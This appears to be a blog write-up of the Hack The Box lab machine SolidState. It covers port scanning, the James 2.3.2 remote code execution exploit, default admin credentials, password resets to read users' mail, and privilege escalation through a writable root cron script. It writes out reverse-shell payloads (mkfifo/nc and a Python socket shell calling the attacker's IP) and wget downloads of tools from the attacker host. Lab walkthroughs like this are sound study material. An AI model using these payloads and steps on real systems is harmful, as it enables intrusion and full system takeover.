I">$<h1 id="introductionsolidstate">Introduction@Solidstate:~$</h1>

<table>
  <thead>
    <tr>
      <th>Column</th>
      <th>Details</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Name</td>
      <td>SolidState</td>
    </tr>
    <tr>
      <td>IP</td>
      <td>10.10.10.51</td>
    </tr>
    <tr>
      <td>Points</td>
      <td>30</td>
    </tr>
    <tr>
      <td>Os</td>
      <td>Linux</td>
    </tr>
    <tr>
      <td>Difficult</td>
      <td>Medium</td>
    </tr>
    <tr>
      <td>Creator</td>
      <td><a href="https://www.hackthebox.eu/home/users/profile/3338">ch33zplz</a></td>
    </tr>
    <tr>
      <td>Out on</td>
      <td>8th September 2017</td>
    </tr>
  </tbody>
</table>

<h1 id="summary">Summary:~$</h1>

<ul>
  <li>Discovering the new host and scanning for open ports.</li>
  <li>Found a  <code class="language-plaintext highlighter-rouge">vulnerability</code> for port 110 i.e. <em>JAMES pop3d 2.3.2</em>.</li>
  <li>Made the exploit running by loging in port <code class="language-plaintext highlighter-rouge">4555</code> i.e <em>james-admin JAMES Remote Admin 2.3.2</em> with default credentials <strong>root:root</strong>.</li>
  <li>Accessing mails for other users by changing their <code class="language-plaintext highlighter-rouge">passwords</code> from <em>Remote Admin Pannel</em> on port 4555.</li>
  <li>Got reverse shell as soon as accessed <code class="language-plaintext highlighter-rouge">SSH</code> for a user.</li>
  <li>Exploited a <code class="language-plaintext highlighter-rouge">cronjob</code> to escalate privileges.</li>
</ul>

<h1 id="starting">Starting:~$</h1>

<h2 id="nmap">Nmap</h2>

<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>

<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/nmap-scan-1.png" alt="" /></p>

<p>Let’s access <code class="language-plaintext highlighter-rouge">Port 80</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/port-80-2.png" alt="" /></p>

<p>Moved around a bit, but didn’t find anything interesting. I used <code class="language-plaintext highlighter-rouge">dirbuster</code> for hidden directories but couldn’t find anything.</p>

<p>I used <code class="language-plaintext highlighter-rouge">searchsploit</code> to check about <strong>JAMES pop3d 2.3.2</strong> which is a <code class="language-plaintext highlighter-rouge">pop3</code> service.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/searchsploit-james-4.png" alt="" /></p>

<p>It shows Remote Code Execution but before that we need to change the payload present in the python file.</p>

<p><em>Original Script</em>:</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/update-the-code-on-script-5.png" alt="" /></p>

<p>Changed it with <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Payload</a></p>

<table>
  <tbody>
    <tr>
      <td>*Payload–&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
      <td>/bin/sh -i 2&gt;&amp;1</td>
      <td>nc 10.10.X.X 9999 &gt;/tmp/f*</td>
    </tr>
  </tbody>
</table>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/final-exploit-7.png" alt="" /></p>

<p>I ran the script once and came to know that when a user will login in <code class="language-plaintext highlighter-rouge">SSH</code> then only this script will work.</p>

<p>By the time from the <code class="language-plaintext highlighter-rouge">full port scan</code> I came to know that <code class="language-plaintext highlighter-rouge">Port 4555</code> is also open.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/nmap-scan-new-1.png" alt="" /></p>

<p><em>JAMES Remote Admin 2.3.2</em> is running. Accessing port <code class="language-plaintext highlighter-rouge">4555</code> via <em>telnet</em>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/accessed-port-4555-james-6.png" alt="" /></p>

<p>I used default credentials and loggedin. <strong>Credentials</strong>: <em>root:root</em>.</p>

<p>Checking the users by using the <code class="language-plaintext highlighter-rouge">help</code> command.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/list-of-users-8.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">5 Users</code> are present i.e:</p>

<ul>
  <li>james</li>
  <li>mindy</li>
  <li>thomas</li>
  <li>mailadmin</li>
  <li>john</li>
</ul>

<p>From the <code class="language-plaintext highlighter-rouge">help</code> command, we have the permission to change the password of any user. Let’s do that and acess their respective mails on port <code class="language-plaintext highlighter-rouge">110</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/resetting-passwords-9.png" alt="" /></p>

<p>Now the username is also the password eg. For user <code class="language-plaintext highlighter-rouge">james</code> password is <code class="language-plaintext highlighter-rouge">james</code>.</p>

<p>Mails for <code class="language-plaintext highlighter-rouge">james</code> and <code class="language-plaintext highlighter-rouge">thomas</code> were empty but <code class="language-plaintext highlighter-rouge">john</code> gave us something.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/reading-johns-mail-12.png" alt="" /></p>

<p>Let’s access <code class="language-plaintext highlighter-rouge">Mindy's</code> mail. There are 2 mails for Mindy, Reading the second mail we got the password for <code class="language-plaintext highlighter-rouge">SSH</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/mindy-account-mail-two-14.png" alt="" /></p>

<p><strong>Username</strong>: <em>mindy</em>
<strong>Password</strong>: <em>P@55W0rd1!2@</em></p>

<p>Now let’s listen on the port (<em>9999</em>) which I had specified during changing the payload in the <code class="language-plaintext highlighter-rouge">python script</code>. and login into <code class="language-plaintext highlighter-rouge">SSH</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/running-ssh-and-got-shell-15.png" alt="" /></p>

<p>As soon as I logged into <em>SSH</em>, it didn’t respond and we got a shell as <code class="language-plaintext highlighter-rouge">mindy</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/got-shell-as-mindy-16.png" alt="" /></p>

<p>Got <code class="language-plaintext highlighter-rouge">User Flag</code>.</p>

<p>For <code class="language-plaintext highlighter-rouge">Privilege Escalation</code>, downloading <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh">linpeas.sh</a> on victim machine using wget and hosting it on local system.</p>

<p><strong>Wget Command</strong>: <em>wget http://10.10.X.X:8081/linpeas.sh</em></p>

<p><strong>Hosting Command</strong>: <em>python3 -m http.server 8081</em></p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/downloading-linpeas-17.png.png" alt="" /></p>

<p>Running it by giving executable permissions: <em>chmod +x linpeas.sh</em>, I found something interesting:</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/something-interesting-18.png" alt="" /></p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/permissions-tmp-py-19.png" alt="" /></p>

<p>The file is owned by <code class="language-plaintext highlighter-rouge">root</code> but we have write access, further using <a href="https://github.com/DominicBreuker/pspy/blob/master/README.md">pspy32</a> to detect whether it’s a cronjob or not i.e. <code class="language-plaintext highlighter-rouge">tmp.py</code>.</p>

<p><strong>Wget Command</strong>: <em>wget http://10.10.X.X:8081/pspy32</em></p>

<p><strong>Hosting Command</strong>: <em>python3 -m http.server 8081</em></p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/downloading-pspy32-21.png" alt="" /></p>

<p>Running it by giving executable permissions: <em>chmod +x pspy32</em>, Every 3 minutes a cronjob is runnning of tmp.py.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/pspy-cronjob-21.png" alt="" /></p>

<p>Now let’s write our <code class="language-plaintext highlighter-rouge">payload</code> in tmp.py and get <code class="language-plaintext highlighter-rouge">Root</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthbox/changing-data-in-tmp-py-20.png" alt="" /></p>

<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Payload</a>:</p>

<p><em>echo ‘#!/usr/bin/env python’ &gt; tmp.py</em></p>

<p><em>echo ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.3”,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ » tmp.py</em></p>

<p>Let’s listen on <code class="language-plaintext highlighter-rouge">port 8989</code> using <code class="language-plaintext highlighter-rouge">nc</code>.</p>

<hr />
<p><img src="/assets/img/solidstate-hackthebox/got-root-22.png" alt="" /></p>

<p>Got <code class="language-plaintext highlighter-rouge">Root</code>.</p>
:ET